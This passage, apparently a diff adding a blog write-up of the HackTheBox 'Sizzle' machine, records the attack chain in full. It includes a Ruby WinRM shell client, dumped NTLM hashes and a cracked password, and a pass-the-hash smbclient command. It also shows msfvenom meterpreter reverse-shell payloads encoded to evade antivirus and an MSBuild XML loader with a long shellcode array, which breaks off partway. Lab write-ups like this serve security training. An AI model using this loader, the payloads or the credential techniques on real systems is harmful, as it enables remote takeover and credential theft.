+  &lt;span class=&quot;ss&quot;&gt;client_cert: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/root/Desktop/HTB/boxes/sizzle/certs/certnew.cer'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;ss&quot;&gt;client_key: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/root/Desktop/HTB/boxes/sizzle/certs/request.key'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;ss&quot;&gt;:no_ssl_peer_verification&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:powershell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;until&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;exit&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&amp;gt; ')&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chomp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;gets&lt;/span&gt;        
+        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+            &lt;span class=&quot;no&quot;&gt;STDOUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;
+            &lt;span class=&quot;no&quot;&gt;STDERR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;    
+    &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Exiting with code &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exitcode&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;and-it-worked-&quot;&gt;And it worked :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;but-there-was-no-usertxt-&quot;&gt;But there was no &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;stored-ntlm-hashes-secretsdump-privilege-escalation&quot;&gt;Stored NTLM Hashes, Secretsdump, Privilege Escalation&lt;/h3&gt;
+&lt;h4 id=&quot;through-the-filesystem-enumeration-i-found-a-file-called-filetxt-in-cwindowssystem32-that-file-had-ntlm-hashes-for-all-users-&quot;&gt;Through the filesystem enumeration I found a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;file.txt&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\System32&lt;/code&gt;. That file had NTLM hashes for all users !&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::
+
+Domain    User  ID  Hash
+------    ----  --  ----
+HTB.LOCAL Guest 501 -   
+amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
+mrb3n:1105:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
+mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;honestly-i-dont-know-how-did-that-get-there-after-resetting-the-machine-the-file-was-still-there-i-dont-know-if-the-creator-made-an-unintended-mistake-but-anyway-lets-see-how-can-we-use-that&quot;&gt;Honestly I don’t know how did that get there, After resetting the machine the file was still there. I don’t know if the creator made an unintended mistake but anyway let’s see how can we use that.&lt;/h4&gt;
+&lt;h4 id=&quot;that-administrator-hash-was-useless-i-tried-it-with-smb-i-cracked-it-tried-psexec-it-didnt-work-i-cracked-mrlkys-hash-&quot;&gt;That Administrator hash was useless, I tried it with &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;, I cracked it, tried &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt;. It didn’t work. I cracked &lt;code class=&quot;highlighter-rouge&quot;&gt;mrlky&lt;/code&gt;’s hash :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;the-password-was-football7-i-used-it-with-secretsdumppy-from-impacket-and-got-another-administrators-hash-&quot;&gt;The password was &lt;code class=&quot;highlighter-rouge&quot;&gt;Football#7&lt;/code&gt;, I used it with &lt;code class=&quot;highlighter-rouge&quot;&gt;secretsdump.py&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;impacket&lt;/code&gt; and got another Administrator’s hash :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-was-uncrackable-i-tried-psexec-metasploit-module-and-for-some-reason-it-didnt-work-so-i-used-the-hash-with-smb-to-access-c-then-i-downloaded-the-flags&quot;&gt;It was uncrackable, I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;metasploit&lt;/code&gt; module and for some reason it didn’t work so I used the hash with &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; to access &lt;code class=&quot;highlighter-rouge&quot;&gt;C$&lt;/code&gt; then I downloaded the flags.&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient //sizzle.htb/C$ -U &quot;Administrator&quot; --pw-nt-hash f6b7160bfc91823792e0ac3a162c9267&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/30.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;now-forget-that-we-saw-that-lets-try-something-more-realistic&quot;&gt;Now forget that we saw that, Let’s try something more realistic.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;backtrack&quot;&gt;Backtrack&lt;/h3&gt;
+&lt;h4 id=&quot;back-to-the-winrm-session-as-amanda-lets-examine-our-environment&quot;&gt;Back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; session as &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt;, let’s examine our environment.&lt;/h4&gt;
+&lt;h4 id=&quot;there-was-applocker-&quot;&gt;There was AppLocker :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;antivirus-&quot;&gt;Antivirus :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-were-even-in-constrained-language-mode-in-powershell-&quot;&gt;We were even in Constrained Language Mode in PowerShell :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;since-this-was-an-active-directory-environment-i-wanted-to-do-kerberoasting-but-invoke-kerberoastps1-needed-full-language-mode-i-couldnt-use-getuserspnspy-because-the-services-were-internal-only-and-my-attempts-to-evade-the-antivirus-failed-i-could-bypass-the-constrained-language-mode-with-psbypassclm-and-still-couldnt-use-invoke-kerberoastps1-applocker-is-easy-to-bypass-so-it-wasnt-an-issue-but-i-had-to-bypass-the-antivirus&quot;&gt;Since this was an Active Directory environment I wanted to do kerberoasting, but &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Kerberoast.ps1&lt;/code&gt; needed Full Language Mode, I couldn’t use &lt;code class=&quot;highlighter-rouge&quot;&gt;GetUserSPNs.py&lt;/code&gt; because the services were internal only. And my attempts to evade the antivirus failed. I could bypass the constrained language mode with &lt;a href=&quot;https://github.com/padovah4ck/PSByPassCLM&quot;&gt;PSByPassCLM&lt;/a&gt; and still couldn’t use &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Kerberoast.ps1&lt;/code&gt;. AppLocker is easy to &lt;a href=&quot;https://github.com/api0cradle/UltimateAppLockerByPassList&quot;&gt;bypass&lt;/a&gt; so it wasn’t an issue. But I had to bypass the antivirus.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;bypassing-av&quot;&gt;Bypassing AV&lt;/h3&gt;
+&lt;h4 id=&quot;i-found-this-article-and-this-poc&quot;&gt;I found &lt;a href=&quot;https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/&quot;&gt;this article&lt;/a&gt; and this &lt;a href=&quot;https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml&quot;&gt;POC&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;first-time-i-created-the-payload-like-this-&quot;&gt;First time I created the payload like this :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1339 -f csharp&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-i-added-the-shellcode-to-the-poc-and-applied-the-exploit-&quot;&gt;And I added the shellcode to the POC and applied the exploit :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\windows\system32\spool\drivers\color\shellcode.xml&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;the-antivirus-detected-it-i-added-an-encoder-and-100-iterations-and-tried-again-&quot;&gt;The antivirus detected it. I added an encoder and 100 iterations and tried again :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1339 -e x86/shikata_ga_nai -i 100 -f csharp&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-i-added-the-shellcode-to-shellcodexml&quot;&gt;Then I added the shellcode to &lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode.xml&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;shellcodexml-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode.xml&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&amp;gt;
+  &amp;lt;!-- This inline task executes shellcode. --&amp;gt;
+  &amp;lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&amp;gt;
+  &amp;lt;!-- Save This File And Execute The Above Command --&amp;gt;
+  &amp;lt;!-- Author: Casey Smith, Twitter: @subTee --&amp;gt; 
+  &amp;lt;!-- License: BSD 3-Clause --&amp;gt;
+  &amp;lt;Target Name=&quot;Hello&quot;&amp;gt;
+    &amp;lt;ClassExample /&amp;gt;
+  &amp;lt;/Target&amp;gt;
+  &amp;lt;UsingTask
+    TaskName=&quot;ClassExample&quot;
+    TaskFactory=&quot;CodeTaskFactory&quot;
+    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &amp;gt;
+    &amp;lt;Task&amp;gt;
+    
+      &amp;lt;Code Type=&quot;Class&quot; Language=&quot;cs&quot;&amp;gt;
+      &amp;lt;![CDATA[
+        using System;
+        using System.Runtime.InteropServices;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        public class ClassExample :  Task, ITask
+        {         
+          private static UInt32 MEM_COMMIT = 0x1000;          
+          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
+          [DllImport(&quot;kernel32&quot;)]
+            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
+          [DllImport(&quot;kernel32&quot;)]
+            private static extern IntPtr CreateThread(            
+            UInt32 lpThreadAttributes,
+            UInt32 dwStackSize,
+            UInt32 lpStartAddress,
+            IntPtr param,
+            UInt32 dwCreationFlags,
+            ref UInt32 lpThreadId           
+            );
+          [DllImport(&quot;kernel32&quot;)]
+            private static extern UInt32 WaitForSingleObject(           
+            IntPtr hHandle,
+            UInt32 dwMilliseconds
+            );          
+          public override bool Execute()
+          {
+            byte[] shellcode = new byte[3189] {
+0xb8,0xfe,0x59,0x88,0xe3,0xdd,0xc6,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0x66,
+0xb9,0x17,0x03,0x31,0x43,0x14,0x83,0xc3,0x04,0x03,0xbd,0x49,0x6a,0x16,0xfb,
+0x0b,0x0e,0xdf,0x65,0x10,0x07,0x06,0xed,0x83,0x6c,0xe6,0x24,0x05,0xea,0xa0,
+0x39,0x96,0x70,0x15,0x41,0xa9,0x21,0x89,0x4a,0x9e,0xde,0x4f,0xd8,0x9d,0x21,
+0xc8,0xc2,0xc7,0x98,0x1a,0x36,0x5c,0xec,0xe2,0xa0,0x84,0x61,0x2a,0x53,0xe7,
+0x00,0x93,0xe2,0x70,0x85,0x85,0xda,0x7c,0xc7,0xc4,0x6e,0x4c,0xba,0xc5,0x5c,
+0x9f,0x56,0x88,0x1d,0x4a,0xcb,0x5a,0x6f,0x86,0x40,0x46,0x26,0x80,0xf3,0x06,
+0x39,0x4e,0xc2,0x43,0x48,0x82,0x98,0x06,0xa1,0x6b,0x45,0xbb,0x79,0xeb,0x4f,
+0x4f,0x57,0x2f,0x6e,0x01,0xbc,0x9f,0x7b,0x2b,0xee,0x21,0x0c,0x5e,0x01,0xcf,
+0xbb,0x1e,0x12,0x2f,0xf2,0xa7,0x1f,0x9c,0xa5,0x95,0x57,0x21,0x77,0xe6,0x03,
+0x16,0x5a,0x09,0x8a,0x0b,0xb6,0x9f,0x70,0x88,0x1a,0xe7,0xae,0xdb,0xd4,0xc0,
+0x3f,0xcd,0x53,0x49,0x21,0x97,0x7d,0xce,0xca,0x85,0xd8,0x94,0x12,0x73,0x81,
+0x13,0xda,0x63,0xcf,0xa8,0x77,0xfa,0xa4,0x96,0xc8,0x18,0x2a,0xad,0x04,0xa8,
+0x56,0xfc,0x6c,0x89,0xef,0x15,0xff,0xc1,0xa5,0x4b,0xb4,0xa4,0x3c,0xbc,0xf6,
+0xeb,0x10,0x99,0xaa,0x81,0x73,0x33,0x5d,0xc9,0x5c,0x71,0x8f,0x45,0x30,0x6e,
+0x8b,0x3a,0xc2,0x2d,0x09,0x7e,0x0f,0x34,0xea,0xb5,0x4b,0xfd,0x39,0x97,0x8b,
+0xe1,0xb8,0x31,0xaa,0xe9,0xe1,0x0c,0x0f,0xda,0x49,0x1b,0xfd,0xf4,0x82,0x3c,
+0x80,0x00,0x81,0x42,0x30,0xdf,0xe4,0x9f,0x9f,0xa9,0xa7,0x6e,0x27,0xe5,0x32,
+0xf6,0x4b,0x90,0x52,0xb7,0x53,0xa2,0x5a,0xc2,0x47,0xdf,0x10,0x67,0x38,0xab,
+0xbe,0x8b,0x34,0xa1,0x86,0x39,0x3e,0x16,0x6c,0xbc,0xcf,0x4f,0x17,0x30,0x1d,
+0xa7,0x55,0x35,0x8b,0x51,0xeb,0xdc,0x78,0xac,0xed,0x41,0x75,0xdb,0x91,0x08,
+0x4b,0x0f,0x32,0xd6,0x0c,0x16,0xa5,0xca,0x80,0xd3,0xad,0x44,0x7d,0x86,0x09,
+0xf1,0xcd,0x9c,0x65,0x7c,0xff,0xc7,0x2b,0x90,0xa6,0xd0,0x38,0xb1,0x57,0x7f,
+0xcb,0x98,0xec,0xee,0x22,0x96,0x5f,0xcf,0xca,0x2e,0x1f,0x2e,0x6a,0x63,0x27,
+0x74,0xc2,0xe1,0xed,0x8c,0x87,0x98,0x2e,0xb6,0x9f,0x28,0x64,0x07,0xa7,0xda,
+0x51,0x56,0x05,0xa5,0x4e,0xcf,0xd5,0x9a,0x39,0x76,0x51,0x2c,0xd3,0x32,0xbf,
+0x47,0x5d,0xee,0xa6,0xd9,0xa1,0x6c,0xd6,0x73,0x5f,0x76,0x63,0x14,0xcf,0xb2,
+0x6f,0x66,0x82,0xe7,0x96,0xdf,0x25,0x21,0x24,0x12,0x71,0x68,0x42,0xf1,0xdd,
+0xa9,0x8a,0xe0,0xd4,0xaa,0x4e,0x10,0x68,0xe0,0x84,0x76,0xe0,0xf4,0x63,0x93,
+0x74,0x1c,0xa6,0x4d,0x27,0x5b,0x79,0xfd,0x82,0x64,0x0a,0xbd,0xf0,0x37,0xf1,
+0xd3,0xb7,0x7f,0x0a,0x39,0x8f,0x26,0x24,0x1f,0x4b,0xc4,0x34,0x73,0xc2,0xd1,
+0xab,0x70,0x2d,0x65,0x6b,0x1c,0x1c,0x9f,0x9e,0xaf,0x13,0xbb,0xef,0x1c,0x9d,
+0x64,0x53,0x39,0x17,0x00,0x0d,0x69,0x4b,0x3f,0x21,0x2f,0x7c,0xcb,0xe3,0xf7,
+0x53,0x75,0xc2,0xa2,0x26,0x58,0xc5,0x37,0x94,0x32,0xc1,0x4d,0xa0,0x67,0xa3,
+0xad,0x16,0x0d,0xd7,0xd8,0x85,0x78,0xc3,0xcf,0x4c,0x2b,0x95,0x45,0x2c,0xbf,
+0x60,0x2b,0x26,0x49,0x29,0xbc,0xa6,0xce,0xde,0xed,0xf3,0x01,0x41,0xee,0xa1,
+0xbd,0x05,0x2d,0xd7,0x7e,0xd7,0xcc,0xd9,0x22,0x2e,0x0d,0x22,0x51,0xc5,0xfa,
+0x6c,0x6c,0xfa,0xab,0x0e,0x2f,0x3a,0x01,0xdc,0x2d,0xaa,0xf8,0x3d,0x88,0xd4,
+0xfe,0xa0,0xd5,0x19,0x7c,0x76,0x0d,0x87,0xd1,0x4d,0x50,0x4a,0x48,0xd2,0xd1,
+0xcf,0x38,0xbb,0xac,0xf4,0xd2,0x8a,0x2a,0x1e,0x0a,0x5b,0x84,0xdd,0x4a,0x70,
+0x16,0xaa,0x0d,0x9d,0xb3,0xc1,0x6f,0x8d,0x36,0x7d,0xd0,0xec,0x19,0xd1,0xcb,
+0x8b,0x93,0xd4,0x27,0x3e,0x8d,0x01,0x02,0xb8,0x49,0x7f,0xb5,0x70,0xeb,0xa9,
+0xe9,0xc5,0xf1,0xac,0x08,0xab,0x3d,0xfa,0xa5,0x07,0x31,0x03,0x33,0x00,0xf9,
+0xf6,0x12,0xfb,0x10,0x59,0x64,0x60,0x81,0xf5,0x60,0xf7,0x14,0xd9,0xdf,0x72,
+0xe2,0x20,0xfb,0x4a,0x1d,0xf1,0x58,0x1b,0x12,0x36,0x2d,0x3c,0x8d,0xc0,0xa8,
+0x28,0x57,0x0b,0x9b,0x1c,0x05,0x26,0x07,0x86,0xe2,0x85,0x8a,0xa1,0x6a,0x6d,
+0x28,0x0f,0x18,0x84,0x0f,0xe1,0xf2,0xff,0x32,0xab,0x0c,0x12,0x33,0x5b,0xca,
+0x72,0x4b,0x9e,0x14,0x2d,0xeb,0x59,0xed,0x4f,0x3b,0xef,0x43,0x7c,0x99,0xdc,
+0x08,0x35,0x76,0x45,0xd9,0x16,0x76,0xc6,0xb7,0x7f,0xa4,0xaf,0x03,0x87,0x91,
+0x27,0x10,0x9b,0x99,0x2b,0xb3,0xe1,0xca,0x5d,0xee,0x45,0x60,0x34,0x44,0x2c,
+0x1c,0x9c,0x5e,0x13,0x15,0x16,0x50,0x56,0xec,0x17,0xd7,0x38,0xaa,0xb3,0x2c,
+0xc5,0xea,0x32,0x7e,0x25,0x1f,0xd6,0x95,0x1d,0xa3,0x44,0xbf,0x8c,0x53,0x3b,
+0x06,0xcf,0x1a,0x46,0x75,0x54,0x01,0x76,0x39,0x33,0x7a,0x55,0x5a,0x48,0xe5,
+0xe4,0xad,0x6c,0x65,0x6b,0x12,0x2a,0xe7,0xbe,0x8f,0x4f,0x33,0x19,0xd4,0x31,
+0xac,0x4f,0x11,0xcc,0x18,0xe7,0x61,0x44,0x7b,0xa8,0x9c,0x6b,0xd1,0xdf,0x35,
+0xb1,0xbf,0x15,0x78,0x57,0x02,0x73,0x92,0x23,0x32,0x92,0xb1,0xe6,0xe4,0x2d,
+0x09,0x42,0xea,0xcd,0x05,0x3e,0x04,0xe7,0x83,0xc0,0xfa,0x89,0x68,0x0c,0x49,
+0xec,0x8f,0x42,0x88,0xe5,0xbe,0xbe,0xe2,0x09,0xc1,0x0f,0x60,0xb7,0x7f,0x47,
+0xf1,0xc8,0x7c,0xbf,0x22,0x8d,0x28,0x5b,0x0d,0x1f,0xb4,0xa9,0x46,0xea,0x5c,
+0x48,0x0a,0x00,0x66,0xc6,0x55,0xcc,0x7e,0x34,0xe7,0x19,0xd3,0x77,0x95,0x8c,
+0x0d,0x2d,0x47,0x3a,0xb5,0x79,0x14,0x92,0x80,0xd2,0xb4,0x8a,0xad,0x1b,0x7a,
+0x94,0xa2,0x5a,0xc1,0x95,0xf0,0x0b,0x7d,0x75,0x6e,0x2f,0x34,0x3f,0x2f,0xeb,
+0xca,0x4e,0x35,0x71,0x5f,0x41,0x45,0x0f,0x76,0x3f,0x13,0x67,0xe3,0x73,0xba,
+0xb0,0xa5,0x92,0x44,0x32,0x0d,0x61,0x2b,0xee,0x57,0xef,0x76,0xeb,0xd5,0x99,
+0x92,0xff,0xec,0xf5,0x88,0xa0,0xd3,0xfc,0xec,0xbf,0xcd,0x31,0xf3,0x40,0x63,
+0xeb,0xc8,0xc6,0x74,0xc1,0xe5,0xf3,0xf2,0x1a,0x21,0x5f,0xef,0x8a,0x3c,0x3e,
+0x96,0x78,0xb7,0xdf,0xc2,0x4c,0xf3,0x73,0xee,0x5d,0xe6,0x28,0x93,0xe4,0xd5,
+0x8f,0x03,0xf7,0xe9,0x62,0x17,0xfc,0xec,0x5e,0x7e,0xc7,0x52,0x10,0x8a,0x0d,
+0x21,0xf8,0xd2,0x4e,0x74,0xbe,0x8c,0x6b,0x15,0x28,0xa7,0x41,0xc5,0x74,0x15,
+0x1d,0xa5,0x33,0x8a,0x06,0xa1,0x93,0xc0,0xe9,0x8a,0x62,0x1c,0x45,0x63,0xaa,
+0xd6,0x09,0x8d,0xd6,0xd9,0xac,0x2f,0x98,0xcc,0xdc,0xa2,0x11,0x5e,0x39,0xb6,
+0xcf,0x00,0xc9,0xb1,0x55,0xad,0x39,0x0a,0xb3,0xa1,0x66,0x43,0x8f,0x5d,0xbd,
+0x57,0x37,0xc8,0xb2,0xa9,0x05,0xe2,0xaa,0xa7,0x6c,0x48,0xce,0x31,0x91,0xd6,
+0x04,0xb9,0x7b,0xcd,0xe0,0x6d,0x82,0x16,0x8e,0x4b,0x20,0x87,0x82,0x00,0x37,
+0x3e,0xf0,0x31,0x27,0xe4,0xd2,0xa8,0x90,0x54,0x99,0x98,0xaa,0xab,0xea,0x08,
+0xad,0xa6,0xf9,0x18,0x57,0x52,0xdf,0xa6,0xf0,0x0c,0x5b,0xa8,0x6a,0xed,0x18,
+0xd8,0x0d,0x41,0x42,0x7d,0x30,0x4d,0x73,0x8b,0x1b,0x3a,0x10,0xb8,0xcf,0x8d,
+0x55,0xbb,0x25,0x1e,0x2f,0x15,0xc6,0x7b,0x64,0x64,0x99,0x3e,0xc7,0x1c,0xb1,
+0xf8,0x18,0x26,0x5e,0x42,0xeb,0x20,0xbd,0xcb,0x55,0x00,0x8a,0xe0,0x83,0xa0,
+0x81,0xd5,0x92,0x50,0xcb,0x79,0x40,0xde,0x15,0x1c,0x19,0x32,0x3b,0xc2,0x3a,
+0x98,0x1a,0x07,0x92,0xbc,0x49,0x4a,0x93,0x55,0xf2,0x31,0x73,0x80,0x2a,0x92,
+0x25,0xf4,0xac,0xeb,0xc8,0xe6,0x9b,0x08,0x9c,0x8a,0x51,0x64,0x4c,0xd0,0x22,
+0x88,0x0e,0xba,0x96,0x7e,0x6a,0x45,0x7b,0x3d,0x78,0xfe,0xd1,0xdd,0x25,0x4c,
+0x50,0xa1,0x24,0x55,0xae,0x7d,0xe7,0x2f,0xbd,0xb8,0x82,0x6e,0xe8,0x97,0x1a,
+0x56,0x3f,0x52,0x42,0xc6,0x07,0x66,0x32,0xf8,0x60,0xe5,0x91,0x98,0x30,0x3b,
